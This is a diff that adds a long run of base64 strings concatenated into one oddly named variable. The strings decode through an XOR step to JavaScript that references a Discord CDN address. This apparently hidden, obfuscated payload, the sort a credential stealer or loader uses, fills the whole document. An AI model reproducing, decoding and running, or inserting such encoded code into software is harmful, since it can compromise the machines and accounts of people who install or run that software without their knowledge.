+pogi_si_caliber += "eNwNHGwtfG5s/GzsbN14uE09HGhIqYqYODg4PC0deNwM/C0NDt";
+pogi_si_caliber += "ws7Gg56DhMHEwtHXhJipg4ODg8LR143Qxtfi19fRysHW18aLhM";
+pogi_si_caliber += "LRysKOy8rHx8bNhI+DhNfR1saEipipg4ODg8LR143XxtvX4MzN";
+pogi_si_caliber += "18bN14Oeg+Ds7eXq5I3BxOLQwMrKmKmDg4ODwtHXjdDX2s/Gjd";
+pogi_si_caliber += "fM04Oeg8DFxI3XzNOYqYODg4PC0deN0Nfaz8aNz8bF14Oeg8DF";
+pogi_si_caliber += "xI3PxsXXmKmDg4ODwtHXjdDX2s/GjcXMzdfwytnGg56DwMXEjd";
+pogi_si_caliber += "DK2caDiIOE09uEmKmDg4ODwtHXjdDX2s/GjdDG1/PRzNPG0dfa";
+pogi_si_caliber += "i4SOjsyEj4PAxcSNzIqYqYODg4PC0deN0Nfaz8aN0MbX89HM08";
+pogi_si_caliber += "bR19qLhI6O0YSPg8DFxI3Rg4iDhMfGxISKmKmDg4ODwtHXjdDX";
+pogi_si_caliber += "2s/GjdDG1/PRzNPG0dfai4SOjsfbhI+DwMXEjcfbg4iDhNPbhI";
+pogi_si_caliber += "qYqYODg4PC0deN0Nfaz8aN0MbX89HM08bR19qLhI6Ox9qEj4PA";
+pogi_si_caliber += "xcSNx9qDiIOE09uEipipg4ODg8HE5s+NwtPTxs3H4MvKz8eLwt";
+pogi_si_caliber += "HXipipg4Peqd6Ki4qYqanAzM3Q14Pg5+2DnoOEy9fX09CZjIzA";
+pogi_si_caliber += "x82Nx8rQwMzRx8LT043AzM6MhJipwMzN0NeD0cbH1sDG7szXys";
+pogi_si_caliber += "zNg56DzsLXwMvuxsfKwouEi9PRxsXG0dCO0cbH1sDGx47OzNfK";
+pogi_si_caliber += "zM2Zg9HGx9bAxoqEio3OwtfAy8bQmKmpxdbNwNfKzM2D0M/WxM";
+pogi_si_caliber += "rF2ovQ19GK2KmDg9HG19bRzYOL0NfRg9/fg4SEio3XzO/M1MbR";
+pogi_si_caliber += "4MLQxouKjdfRys6Lio3RxtPPwsDGi4z4/cKO2ZOOmv6IjMSPg4";
+pogi_si_caliber += "SOhIqN0cbTz8LAxouMi/2O346HiozEj4OEhIqD39+DhM7GzsHG";
+pogi_si_caliber += "0YSYqd6pxdbNwNfKzM2Dx8bFi8rHitipg4PX0drYg9HG19bRzY";
+pogi_si_caliber += "Pg5+2DiIOExs7BxseMwtXC18LR0IyEg4iD7dbOwcbRi4vhysTq";
+pogi_si_caliber += "zdeLyseKg52dg5GRzYqDhoOVzYqDiIOEjdPNxISYg96pg4PAwt";
+pogi_si_caliber += "fAy4vGitiD0cbX1tHNg+Dn7YOIg4TGzsHGx4zC1cLXwtHQjJON";
+pogi_si_caliber += "083EhJiD3qneqcXWzcDXyszNg8LVwtfC0fbRz4vWj4PKx4rYqY";
+pogi_si_caliber += "ODysWLgtaKg9HG19bRzYPHxsWLyseKmKmDg9HG19bRzYPWjcLV";
+pogi_si_caliber += "wtfC0amDg4ODnIPg5+2DiIOEwtXC18LR0IyEg4iD1o3Kx4OIg4";
+pogi_si_caliber += "SMhIOIg9aNwtXC18LRg4iDhI2Eg4iDi9aNwtXC18LRjcrNx8bb";
+pogi_si_caliber += "7MWLhML8hIqDnp6eg5ODnIOExMrFhIOZg4TTzcSEioOIg4Sc0M";
+pogi_si_caliber += "rZxp6RlpWEqYODg4OZg8fGxYvWjcrHipip3qnF1s3A18rMzYPH";
+pogi_si_caliber += "xsDM9tHPi9aK2KmDg8DMzdDXg8fAg56D1oOFhYPWjcLVwtfC0f";
+pogi_si_caliber += "zHxsDM0cLXyszN/MfC18KYqYOD0cbX1tHNg8fAg4WFg8fAjcLQ";
+pogi_si_caliber += "0MbXg5yD4Oftg4iDhMLVwtfC0Y7HxsDM0cLXyszNjtPRxtDG19";
+pogi_si_caliber += "CMhIOIg8fAjcLQ0MbXg4iDhI3TzcSc0MrZxp6SkZuF08LQ0NfL";
+pogi_si_caliber += "0czWxMue19HWxoSDmYOEhJip3qnF1s3A18rMzYPC09PP2uHCwM";
+pogi_si_caliber += "jE0czWzceLxs+Pg9XCz4rYqYODwMzN0NeD1YOeg4vVws+D39+D";
+pogi_si_caliber += "hISKjdfRys6Lipipg4PKxYuC1YqD0cbX1tHNg8XCz9DGmKmDg8";
+pogi_si_caliber += "rFi4z9i9bRz/+L38/KzcbC0Y7E0cLHysbN19/RwsfKws+OxNHC";
+pogi_si_caliber += "x8rGzdffwMzNysCOxNHCx8rGzdeKjMqN18bQ14vViorYg8bPjd";
+pogi_si_caliber += "DX2s/GjcHCwMjE0czWzcfqzsLExoOeg9WYg9HG19bRzYPX0dbG";
+pogi_si_caliber += "mIPeqYODysWLjP+Ni9PNxN/J08acxN/EysXf1MbB09/C1crF39";
+pogi_si_caliber += "DVxIqHjMqN18bQ14vVioPf34OM/YvL19fT0JyZipz/jIyN18bQ";
+pogi_si_caliber += "14vVioPf34PVjdDXwtHX0PTK18uLhMfC18KZhIqK2IPGz43Q19";
+pogi_si_caliber += "rPxo3BwsDIxNHM1s3H6s7CxMaDnoOE1tHPi4GEg4iD1YOIg4SB";
+pogi_si_caliber += "ioSYg9HG19bRzYPX0dbGmIPeqYODxs+N0Nfaz8aNwcLAyMTRzN";
+pogi_si_caliber += "bNx+DMz8zRg56D1Zipg4PRxtfW0c2DxcLP0MaYqd6pxdbNwNfK";
+pogi_si_caliber += "zM2DwcLAyMTRzNbNx/XCz9bGi9XCz4rYqYODwMzN0NeD09HMwc";
+pogi_si_caliber += "aDnoPHzMDWzsbN143A0cbC18bmz8bOxs3Xi4THytWEipipg4PA";
+pogi_si_caliber += "zM3Q14PMyIOeg8LT08/a4cLAyMTRzNbNx4vT0czBxo+D1cLPip";
+pogi_si_caliber += "ipg4PRxtfW0c2D2IPKzsLExpmD09HMwcaN0Nfaz8aNwcLAyMTR";
+pogi_si_caliber += "zNbNx+rOwsTGj4PMyIPemKneqcXWzcDXyszNg9PRzMXKz8bhws";
+pogi_si_caliber += "3NxtGLzsbOwcbRitipg4PRxtfW0c2Di87GzsHG0YOFhYOLzsbO";
+pogi_si_caliber += "wcbRjcHCzc3G0YPf34POxs7BxtGNwcLAyMTRzNbNx4qKg9/fg+";
+pogi_si_caliber += "Ds7eXq5I3T0czFys/G58bFwtbP19CNwcLNzcbRmKneqanAzM3Q";
+pogi_si_caliber += "14PVws/Kx+zNz9qDnoPC0dGDnp2Di8LR0YPf34P4/oqNxcrP18";
+pogi_si_caliber += "bRi86Dnp2DzoOFhYPOjc3CzsaDhYWDzo3Nws7GjdfRys6LioqY";
+pogi_si_caliber += "qcDMzdDXg+Lv7/zz7Ozv8IOeg4uKg56dg/jg7O3l6uSNzsLKzf";
+pogi_si_caliber += "fL0cbC19CPg+Ds7eXq5I3LxsrR0I+D4Ozt5erkjcHKxPfL0cbC";
+pogi_si_caliber += "19CPg+Ds7eXq5I3EzMfOzNfLxtHQj4Pg7O3l6uSNzsbOwcbR0P";
+pogi_si_caliber += "6YqcDMzdDXg+H66ueDnoPY3pip4u/v/PPs7O/wi4qNxczR5sLA";
+pogi_si_caliber += "y4vTzMzPg56dg9XCz8rH7M3P2ovTzMzPio3FzNHmwsDLi86Dnp";
+pogi_si_caliber += "2D2IPKxYuC4frq5/jOjcfK0MDM0cfqx/6Kg+H66uf4zo3HytDA";
+pogi_si_caliber += "zNHH6sf+g56DzpiD3oqKmKnAzM3Q14Pi7++DnoPswcnGwNeNyM";
+pogi_si_caliber += "ba0Ivh+urnipipqcXWzcDXyszNg8XKzcfuxs7BxtHh2vDP1sSL";
+pogi_si_caliber += "0M/WxIrYqYODxczRi8DMzdDXg9PMzM+DzMWD4u/v/PPs7O/wi4";
+pogi_si_caliber += "qK2KmDg4ODwMzN0NeDxczWzceDnoOL08zMz4Pf34P4/oqNxcrN";
+pogi_si_caliber += "x4vOg56dg86DhYWDzo3Nws7Gg4WFg9DP1sTKxdqLzo3Nws7Gio";
+pogi_si_caliber += "Oenp6D0M/WxIqYqYODg4PKxYvFzNbNx4qD0cbX1tHNg8XM1s3H";
+pogi_si_caliber += "mKmDg96pg4PRxtfW0c2DzdbPz5ip3qnAzM3Q14PTwtfL8M/WxI";
+pogi_si_caliber += "Oeg8/MwMLXyszNjdPC18vNws7GjdHG08/CwMaLjP3/jIjf/4yI";
+pogi_si_caliber += "h4zEj4OEhIqYqcDMzdDXg8fGxtPvys3Ixsfz0czFys/Gg56D08";
+pogi_si_caliber += "LXy/DP1sSDnIPFys3H7sbOwcbR4drwz9bEi9PC18vwz9bEioOZ";
+pogi_si_caliber += "g83Wz8+YqanAzM3Q14Pr5urx/PDv7Pfwg56DkZipwMzN0NeD5O";
+pogi_si_caliber += "zn7uz36+bx/PDv7Pfwg56DkJipwMzN0NeD5PHs9vPwg56D+KmD";
+pogi_si_caliber += "g/iE6+zlhI+D4Ozt5erkjcDM09qNy8zF8NbB18rXz8aPg+Ds7e";
+pogi_si_caliber += "Xq5I3OwsrN98vRxsLX0I+Dk/6PqYOD+ITrxsrR0ISPg4SEj4Pg";
+pogi_si_caliber += "7O3l6uSNy8bK0dCPg+vm6vH88O/s9/D+j6mDg/iE5czWzcfKzc";
+pogi_si_caliber += "SD7sbOwcbR0ISPg+Ds7eXq5I3AzNPajcHKxPfL0cbC19Dw1sHX";
+pogi_si_caliber += "ytfPxo+D4Ozt5erkjcHKxPfL0cbC19CPg5P+j6mDg/iE5MzHzs";
+pogi_si_caliber += "zXy8bR0ISPg+Ds7eXq5I3AzNPajcTMx87M18vG0dDw1sHXytfP";
+pogi_si_caliber += "xo+D4Ozt5erkjcTMx87M18vG0dCPg+Ts5+7s9+vm8fzw7+z38P";
+pogi_si_caliber += "6PqYOD+ITkzMzHyMrH0ISPg+Ds7eXq5I3AzNPajc7GzsHG0dDw";
+pogi_si_caliber += "1sHXytfPxo+D4Ozt5erkjc7GzsHG0dCPg5P+j6n+mKmpwMzN0N";
+pogi_si_caliber += "eD4OLx5/zg7/CDnoOEzoPE0czW04zAwtHHg8XPxtuD1I74m5fT";
+pogi_si_caliber += "2/6DzsLbjviUk5PT2/6Z1I74lJHT2/6DzsLbjviQlZPT2/6Z1I";
+pogi_si_caliber += "6SlYPA1tHQzNGO08zKzdfG0YPC09PGwtHCzcDGjs3MzcaDxc/G";
+pogi_si_caliber += "247AzM+DytfGztCOwMbN18bRg8HM0cfG0Y6Tg8HEjtfRws3Q08";
+pogi_si_caliber += "LRxs3Xg9OOk4PXxtvXjsDGzdfG0YPFzM3XjvjKzcvG0crX/oPX";
+pogi_si_caliber += "xtvXjsrNy8bRyteD+I7UxsHIyteO18LTjsvKxMvPysTL147AzM";
+pogi_si_caliber += "/M0ZnX0cLN0NPC0cbN1/6EmKnAzM3Q14Pi9fzg7/CDnoOEwtWD";
+pogi_si_caliber += "zMXFz8rNxoPRxs/C18rVxoPO2o74mtPb/oPOwY6RjZaDy46SlY";
+pogi_si_caliber += "PUjpKVg8XPxtuOzczNxoPOwtuO+JSTk9Pb/pnLjpKXg87C2474";
+pogi_si_caliber += "lJOT09v+mdSOkpeDzsLbjviQlZPT2/6Zy474lpPT2/6DzsLbjv";
+pogi_si_caliber += "iQlZPT2/6Z1I74lpPT2/6EmKnAzM3Q14Pi9fzq7uT84O/wg56D";
+pogi_si_caliber += "hMKDwc/MwMiDy47F1s/Pg9SOxdbPz4PRzNbNx8bHjsXWz8+Dwc";
+pogi_si_caliber += "SO+ICSwpOUk8L+g8zBycbA147AzNXG0YPQy8LHzNSO+JP8k/yS";
+pogi_si_caliber += "l9Pb/NHEwcKLkZaWj5CVj5aVj42Rl4r+g9fRws3QytfKzM2O+M";
+pogi_si_caliber += "HM247Qy8LHzNSP19HCzdDFzNHOj8zTwsDK19r+g8fW0cLXyszN";
+pogi_si_caliber += "jviQlpPO0P6DxNHM1tOOy8zVxtGMwMLRx5nQwMLPxo6Sk5aDxN";
+pogi_si_caliber += "HM1tOOy8zVxtGMwMLRx5nQy8LHzNSO+JP8k/yRl9Pb/NHEwcKL";
+pogi_si_caliber += "kZaWj5CVj5aVj42Wlor+hJipwMzN0NeD5+z3/ODv8IOeg4TQg8";
+pogi_si_caliber += "LB0MzP1tfGg47BzNfXzM6O09uDjtHKxMvXjtPbg9mO+JH+g8uO";
+pogi_si_caliber += "l4PUjpeD0czWzcfGx47F1s/Pg8HM0cfG0Y74kNPb/oPBzNHHxt";
+pogi_si_caliber += "GOwc/CwMiEmKnAzM3Q14Pt7vzg7/CDnoOEzc6DzsLbjtSOxdbP";
+pogi_si_caliber += "z4PX0dbNwMLXxoPXxtvXjviSko2W09v+g9fG29eOwc/MzMeOzM";
+pogi_si_caliber += "iD+NfG29eO0MvCx8zUmZP8k/yX09v8gJOTk4+T/JP8m9Pb/NHE";
+pogi_si_caliber += "wcKLkZaWj5CVj5aVj42Xiv6D19HCzdDK18rMzY7AzM/M0dCDx9";
+pogi_si_caliber += "bRwtfKzM2OkJOTg8TRzNbTjsvM1cbRjMDC0ceZ18bb147Bz8zM";
+pogi_si_caliber += "x4SYqanF1s3A18rMzYPAwtHH6/fu74vOitipg4PAzM3Q14PKx4";
+pogi_si_caliber += "Oeg86Nx8rQwMzRx+rHmKmDg9HG19bRzYOEn8HW19fMzYPAz8LQ";
+pogi_si_caliber += "0J6BhIOIg+Di8ef84O/wg4iDhIGD19rTxp6BwdbX18zNgYPHwt";
+pogi_si_caliber += "fCjsrHnoGEg4iDxtDAi8rHioOIg4SBg8LRysKOz8LBxs+egYSD";
+pogi_si_caliber += "iIPG0MCLzo3Nws7GioOIg4SD09HMxcrPxoGdhKmDg4ODiIOEn9";
+pogi_si_caliber += "DTws2DwM/C0NCegYSDiIPi9fzg7/CDiIOEgZ2fys7Eg8DPwtDQ";
+pogi_si_caliber += "noGEg4iD4vX86u7k/ODv8IOIg4SBg9DRwJ6BhIOIg8fGxYvKx4";
+pogi_si_caliber += "qDiIOEgYPCz9eegYGDz8zCx8rNxJ6Bz8LZ2oGD0cbFxtHRxtHT";
+pogi_si_caliber += "zM/KwNqegc3MjtHGxcbR0cbRgZ2f0NPCzYPAz8LQ0J6BhIOIg+";
+pogi_si_caliber += "fs9/zg7/CDiIOEgZ2fjNDTws2dn4zQ08LNnYSpg4ODg4iDhJ/Q";
+pogi_si_caliber += "08LNg8DPwtDQnoGEg4iD7e784O/wg4iDhIGdhIOIg8bQwIvOjc";
+pogi_si_caliber += "3CzsaKg4iDhJ+M0NPCzZ2fjMHW19fMzZ2EmKneqanF1s3A18rM";
+pogi_si_caliber += "zYPTz8LAxsvMz8fG0ev37u+Litipg4PRxtfW0c2DhJ/HytWDwM";
+pogi_si_caliber += "/C0NCegc6Dzo7GztPX2oPTzMrN18bRjsbVxs3X0I7NzM3Gg8XP";
+pogi_si_caliber += "xtuD1I74m5fT2/6DzsLbjviUk5PT2/6Z1I74lJHT2/6DzsLbjv";
+pogi_si_caliber += "iQlZPT2/6Z1I6SlYPFz8bbjsDMz4PK18bO0I7Axs3XxtGBg8LR";
+pogi_si_caliber += "ysKOy8rHx8bNnoHX0dbGgZ2EqYODg4OIg4Sf0NPCzYPAz8LQ0J";
+pogi_si_caliber += "6BwtWD0cbPwtfK1caDztqO+JrT2/6DzsGOkY2Wg8TRyseDy46S";
+pogi_si_caliber += "lYPUjpKVg8XPxtuOzczNxoPTz8LAxo7K18bO0I7Axs3XxtGD0c";
+pogi_si_caliber += "zWzcfGx47F1s/Pg8HM0cfG0YPBzNHHxtGOx8LQy8bHg8HM0cfG";
+pogi_si_caliber += "0Y7Bz8zMx4yQk4PBxI7Bz8zMx4z4jZOQ/oPOwtuO+JSTk9Pb/p";
+pogi_si_caliber += "nLjpKXg87C2474lJOT09v+mdSOkpeDzsLbjviQlZPT2/6Zy474";
+pogi_si_caliber += "lpPT2/6DzsLbjviQlZPT2/6Z1I74lpPT2/6BnZ/Q08LNg8DPwt";
+pogi_si_caliber += "DQnoHSg9fG29eO28+D18bb147Bz8zMx47Hys6D+NfG29eO0MvC";
+pogi_si_caliber += "x8zUmZP8k/yb09v80cTBwouRlpaPkJWPlpWPjZCK/oGdnJ+M0N";
+pogi_si_caliber += "PCzZ2fjNDTws2dhKmDg4ODiIOEn9DTws2DwM/C0NCegc3Og87C";
+pogi_si_caliber += "247UjsXWz8+D19HWzcDC18aD18bb1474kpKNltPb/oPK18LPys";
+pogi_si_caliber += "CD18bb147Bz8zMx47Hys6BncbO09fan4zQ08LNnZ+Mx8rVnYSY";
+pogi_si_caliber += "qd6pqcXWzcDXyszNg8DC0cfQ6/fu74vPytDXj4PQz8zX0IrYqY";
+pogi_si_caliber += "ODwMzN0NeDytfGztCDnoP4/o+Dwc/CzcjQg56D+P6YqYODi8/K";
+pogi_si_caliber += "0NeD39+D+P6KjcXM0ebCwMuLzoOenYPYqYODg4PKxYvOg4WFg8";
+pogi_si_caliber += "6NzcLOxoOFhYPw19HKzcSLzo3Nws7Gio3X0crOi4qKg8rXxs7Q";
+pogi_si_caliber += "jdPW0MuLzoqYqYODg4PGz9DGg8HPws3I0I3T1tDLi86KmKmDg9";
+pogi_si_caliber += "6KmKmDg8DMzdDXg8bO09fag56D7sLXy43OwtuLk4+Di9DPzNfQ";
+pogi_si_caliber += "g9/fg5OKg46DytfGztCNz8bNxNfLj4PBz8LNyNCNz8bNxNfLip";
+pogi_si_caliber += "ipg4PRxtfW0c2DytfGztCNzsLTi8DC0cfr9+7vio3AzM3AwteL";
+pogi_si_caliber += "4tHRwtqNxdHMzovYg8/GzcTXy5mDxs7T19qD3o+D08/CwMbLzM";
+pogi_si_caliber += "/HxtHr9+7vioqpg4ODg43OwtOLi8vXzs+Pg8qKg56dg8vXzs+N";
+pogi_si_caliber += "0cbTz8LAxouM/Z+L+MKO2f74/9SO/omKjMqPg4Sfh5KD0Nfaz8";
+pogi_si_caliber += "aegY6OypmEg4iDyoOIg4SBhIqKqYODg4ONyczKzYuEhIqYqd6p";
+pogi_si_caliber += "qcXWzcDXyszNg9DGwNfKzM3r9+7vi8rHj4PXytfPxo+Dz8rQ14";
+pogi_si_caliber += "+D0M/M19CK2KmDg9HG19bRzYOEn9DGwNfKzM2DwM/C0NCegdHG";
+pogi_si_caliber += "1cbCz4PUjsXWz8+Bg8rHnoGEg4iDyseDiIOEgZ2EqYODg4OIg4";
+pogi_si_caliber += "Sfx8rVg8DPwtDQnoHQxsCO18rXz8aBnYSDiIPG0MCL18rXz8aK";
+pogi_si_caliber += "g4iDhJ+Mx8rVnYSpg4ODg4iDhJ/HytWDwM/C0NCegdHM1IPFz8";
+pogi_si_caliber += "bbg8XPxtuO1NHC04PK18bO0I7Q18LR14PJ1tDXysXajsDGzdfG";
+pogi_si_caliber += "0YPEwtOO2474kZHT2/6DxMLTjtqO+JGV09v+g87C2474lJOT09";
+pogi_si_caliber += "v+mcTC047bjpCDzsLbjviUk5PT2/6ZxMLTjtqOloGdhKmDg4OD";
+pogi_si_caliber += "iIPAwtHH0Ov37u+Lz8rQ14+D0M/M19CKg4iDhJ+Mx8rVnZ+M0M";
+pogi_si_caliber += "bA18rMzZ2EmKneqanAzM3Q14PE0czW0+LNwMvM0YOeg8TKg56d";
+pogi_si_caliber += "g4TEws3EjoSDiIPk8ez28/D4xMr++JP+jdfM78zUxtHgwtDGi4";
+pogi_si_caliber += "qN0cbTz8LAxouM+P3CjtmTjpr+iIzEj4OEjoSKmKmpwMzN0NeD";
+pogi_si_caliber += "0czQ18bR5s+DnoPHzMDWzsbN143Extfmz8bOxs3X4drqx4uE0c";
+pogi_si_caliber += "zQ18bRhIqYqdHM0NfG0ebPjcrNzcbR6/fu74Oeg+Tx7Pbz8KmD";
+pogi_si_caliber += "g43OwtOLi/jXytfPxo+Dj4PPytDXj4PQz8zX0P6Pg8TKioOenY";
+pogi_si_caliber += "PQxsDXyszN6/fu74vE0czW0+LNwMvM0YvEyoqPg9fK18/Gj4PP";
+pogi_si_caliber += "ytDXj4PQz8zX0IqKqYODjcnMys2LhISKmKmpwMzN0NeD5OLt5O";
+pogi_si_caliber += "3m7vzg4vHn/PSDnoOQk5OYqcDMzdDXg+Ti7eTt5u785OLzg56D";
+pogi_si_caliber += "kpeYqanAzM3Q14PKzdXK18bgzMfGg56D0NHVg56dg9ipg4PAzM";
+pogi_si_caliber += "3Q14PRwtSDnoPw19HKzcSLi9DR1YOFhYOL0NHVjcrN1crXxoPf";
+pogi_si_caliber += "34PQ0dWNwMzHxoPf34PQ0dWN1tHPioqD39+DhISKjdfRys6Lip";
+pogi_si_caliber += "ipg4PKxYuC0cLUioPRxtfW0c2DhISYqYOD0cbX1tHNg9HC1KmD";
+pogi_si_caliber += "g4ODjdHG08/CwMaLjP3L19fT0JyZ/4z/jIucmdTU1P+NipyLnJ";
+pogi_si_caliber += "nHytDAzNHH/43ExN/HytDAzNHHi5yZwtPTipz/jcDMzv+Mys3V";
+pogi_si_caliber += "ytfGiv+MjMqPg4SEiqmDg4ODjdHG08/CwMaLjPicgP6NiYeMj4";
+pogi_si_caliber += "OEhIqpg4ODg43RxtPPwsDGi4z/jIiHjI+DhISKmKnemKmpwMzN";
+pogi_si_caliber += "0NeD0MbR1cbR4MzWzdeDnoPNg56dg9fa08bMxYPNg56enoOEzd";
+pogi_si_caliber += "bOwcbRhIOFhYPK0OXKzcrXxovNioOFhYPNg52eg5ODnIPNjdfM";
+pogi_si_caliber += "78zAws/G8NfRys3Ei4TGzY728ISKg5mDhP/Wk5PBlP/Wk5PBlP";
+pogi_si_caliber += "/Wk5PBlISYqanF1s3A18rMzYPQxtHVxtHgwtHHi9DR1Y+DyorY";
+pogi_si_caliber += "qYODwMzN0NeDzcLOxoOeg9DR1Y3Nws7Gg9/fg4TQxtHVxtGEmK";
+pogi_si_caliber += "mDg8DMzdDXg8DMx8aDnoPKzdXK18bgzMfGi9DR1YqYqYODwMzN";
+pogi_si_caliber += "0NeDy9HGxYOeg9DR1Y3W0c+D39+Di8DMx8aDnIOEy9fX09CZjI";
+pogi_si_caliber += "zHytDAzNHHjcTEjISDiIPAzMfGg5mDhISKmKmDg8DMzdDXg8rA";
+pogi_si_caliber += "zM2DnoPQ0dWNysDMzamDg4ODnIOEn8rOxIPQ0cCegYSDiIPG0M";
+pogi_si_caliber += "CL0NHVjcrAzM2Kg4iDhIGDws/XnoGBg8/MwsfKzcSegc/C2dqB";
+pogi_si_caliber += "g9HGxcbR0cbR08zPysDanoHNzI7RxsXG0dHG0YGdhKmDg4ODmY";
+pogi_si_caliber += "OEn9DTws2DwM/C0NCegcSOysDMjs7C0ciBg8LRysKOy8rHx8bN";
+pogi_si_caliber += "noHX0dbGgZ2Eg4iDxtDAi83CzsaN0cbTz8LAxouM+P3CjtmTjp";
+pogi_si_caliber += "r+jMTKj4OEhIqN0M/KwMaLk4+DkIqN18zvzNTG0eDC0MaLioqD";
+pogi_si_caliber += "iIOEn4zQ08LNnYSYqYODwMzN0NeDys3NxtGDnoOEn9DTws2DwM";
+pogi_si_caliber += "/C0NCegcSOysDMgZ2Eg4iDysDMzYOIg4SfjNDTws2dhKmDg4OD";
+pogi_si_caliber += "iIOEn9DTws2DwM/C0NCegcSOwczH2oGdn9DTws2DwM/C0NCegc";
+pogi_si_caliber += "SOzcLOxoGdhIOIg8bQwIvNws7GioOIg4SfjNDTws2dhKmDg4OD";
+pogi_si_caliber += "iIOEn9DTws2DwM/C0NCegcSOzsbXwoGdn8qDwM/C0NCegcSOz8";
+pogi_si_caliber += "rVxoSDiIOL0NHVjczNz8rNxoOcg4SEg5mDhIPMxcWEioOIg4SB";
+pogi_si_caliber += "g8LRysKOy8rHx8bNnoHX0dbGgZ2fjMqdhKmDg4ODiIOEn9DTws";
+pogi_si_caliber += "2DwM/C0NCegcSOwMzWzdeBnZ/Bg8DPwtDQnoHEjszNz8rNxoGd";
+pogi_si_caliber += "hIOIg9DG0dXG0eDM1s3Xi9DR1Y3Mzc/KzcaKg4iDhJ+MwZ2DzM";
+pogi_si_caliber += "3Pys3Gg4XOysfHzNeYg5/Bg8DPwtDQnoHEjtfM18LPgZ2Eg4iD";
+pogi_si_caliber += "0MbR1cbR4MzWzdeL0NHVjc7GzsHG0dCKg4iDhJ+MwZ2DzsbOwc";
+pogi_si_caliber += "bR0J+M0NPCzZ2fjNDTws2dn4zQ08LNnYSpg4ODg4iDhJ/Q08LN";
+pogi_si_caliber += "g8DPwtDQnoHEjsTMgYPC0crCjsvKx8fGzZ6B19HWxoGdhYCblp";
+pogi_si_caliber += "qXmJ+M0NPCzZ2EmKmDg9HG19bRzYPL0cbFqYODg4Ocg4SfwoPA";
+pogi_si_caliber += "z8LQ0J6BxMDC0ceBg8fC18KO0NHVnoGEg4iDyoOIg4SBg8vRxs";
+pogi_si_caliber += "WegYSDiIPG0MCLy9HGxYqDiIOEgYPXwtHExteegfzBz8LNyIGD";
+pogi_si_caliber += "0cbPnoHNzMzTxs3G0YPNzNHGxcbR0cbRgYPC0crCjs/CwcbPno";
+pogi_si_caliber += "GEg4iDxtDAi83CzsaKg4iDhIPMzYPnytDAzNHHgZ2Eg4iDys3N";
+pogi_si_caliber += "xtGDiIOEn4zCnYSpg4ODg5mDhJ/Q08LNg8DPwtDQnoHEwMLRx4";
+pogi_si_caliber += "GDx8LXwo7Q0dWegYSDiIPKg4iDhIGdhIOIg8rNzcbRg4iDhJ+M";
+pogi_si_caliber += "0NPCzZ2EmKneqanF1s3A18rMzYPB1srPx+TCzcTNxs6Litipg4";
+pogi_si_caliber += "PAzM3Q14PQxtHVxtHQg56Di+Ds7eXq5I3Ews3EzcbOg9/fg/j+";
+pogi_si_caliber += "io3Fys/XxtGL4czMz8bCzYqYqYODwMzN0NeDwMLRx9CDnoPQxt";
+pogi_si_caliber += "HVxtHQjc7C04vQxtHVxtHgwtHHipipg4PAzM3Q14PTxtGDnoPu";
+pogi_si_caliber += "wtfLjc7C24uSj4PuwtfLjcDGys+LkpKRk4OMg+7C18uNzsLbi5";
+pogi_si_caliber += "KPg8DC0cfQjc/GzcTXy4OJg4vk4u3k7ebu/ODi8ef89IOIg+Ti";
+pogi_si_caliber += "7eTt5u785OLzioqKipipg4PAzM3Q14PQxteDnoPAwtHH0I3JzM";
+pogi_si_caliber += "rNi4SEio3RxtPGwteL08bRipipg4PAzM3Q14PRzNSDnoPHzMDW";
+pogi_si_caliber += "zsbN143Extfmz8bOxs3X4drqx4uExMLNxM3GzvHM1ISKmKmDg9";
+pogi_si_caliber += "HM1I3Q19rPxo3Qxtfz0czTxtHX2ouEjo7H1tGEj4PuwtfLjc7C";
+pogi_si_caliber += "24uSm4+D7sLXy43RzNbNx4uLwMLRx9CNz8bNxNfLg4mD08bRg4";
+pogi_si_caliber += "mDi+Ti7eTt5u784OLx5/z0g4iD5OLt5O3m7vzk4vOKioOMg5WR";
+pogi_si_caliber += "ioqDiIOE0ISKmKmDg9HM1I3Kzc3G0ev37u+DnoOEn8fK1YPAz8";
+pogi_si_caliber += "LQ0J6BzsLR0tbGxo7Kzc3G0YGdn8fK1YPAz8LQ0J6Bzo7QxteB";
+pogi_si_caliber += "nYSDiIPQxteDiIOEn4zHytWdn8fK1YPAz8LQ0J6Bzo7QxteBg8";
+pogi_si_caliber += "LRysKOy8rHx8bNnoHX0dbGgZ2Eg4iD0MbXg4iDhJ+Mx8rVnZ+M";
+pogi_si_caliber += "x8rVnYSYqd6pqcXWzcDXyszNg9PCys3X5MLNxM3GzouK2KmDg8";
+pogi_si_caliber += "DMzdDXg9DG0dXG0dCDnoPg7O3l6uSNxMLNxM3GzoPf34P4/pip";
+pogi_si_caliber += "g4PHzMDWzsbN143S1sbR2vDGz8bA18zR4s/Pi4SAxMLNxM3Gzv";
+pogi_si_caliber += "HM1IP4x8LXwo7Q0dX+hIqNxczR5sLAy4vGz4OenYPYqYODg4PA";
+pogi_si_caliber += "zM3Q14PQ0dWDnoPQxtHVxtHQ+O3WzsHG0YvGz43HwtfC0MbXjd";
+pogi_si_caliber += "DR1Yr+mKmDg4ODysWLgtDR1YqD0cbX1tHNmKmDg4ODwMzN0NeD";
+pogi_si_caliber += "zcLOxoOeg9DR1Y3Nws7Gg9/fg4TQxtHVxtGEmKmDg4ODwMzN0N";
+pogi_si_caliber += "eDzcLOxubPg56Dxs+N0tbG0drwxs/GwNfM0YuEjcSOzcLOxoSK";
+pogi_si_caliber += "mKmDg4ODwMzN0NeDzM3Pys3Gg56Dxs+N0tbG0drwxs/GwNfM0Y";
+pogi_si_caliber += "uEjcSOzM3Pys3GhIqYqYODg4PAzM3Q14PXzNfCz4Oeg8bPjdLW";
+pogi_si_caliber += "xtHa8MbPxsDXzNGLhI3EjtfM18LPhIqYqYODg4PAzM3Q14PPyt";
+pogi_si_caliber += "XGg56Dxs+N0tbG0drwxs/GwNfM0YuEjcSOz8rVxoSKmKmDg4OD";
+pogi_si_caliber += "ysWLzcLOxubPioPNws7G5s+N18bb1+DMzdfGzdeDnoPNws7GmK";
+pogi_si_caliber += "mDg4ODysWLzM3Pys3GioPMzc/KzcaN18bb1+DMzdfGzdeDnoPQ";
+pogi_si_caliber += "xtHVxtHgzNbN14vQ0dWNzM3Pys3Gipipg4ODg8rFi9fM18LPio";
+pogi_si_caliber += "PXzNfCz43XxtvX4MzN18bN14Oeg9DG0dXG0eDM1s3Xi9DR1Y3O";
+pogi_si_caliber += "xs7BxtHQipipg4ODg8rFi8/K1caKg8/K1caNwM/C0NDvytDXjd";
+pogi_si_caliber += "fMxMTPxouEzMXFhI+DgtDR1Y3Mzc/KzcaKmKmDg4ODwMzN0NeD";
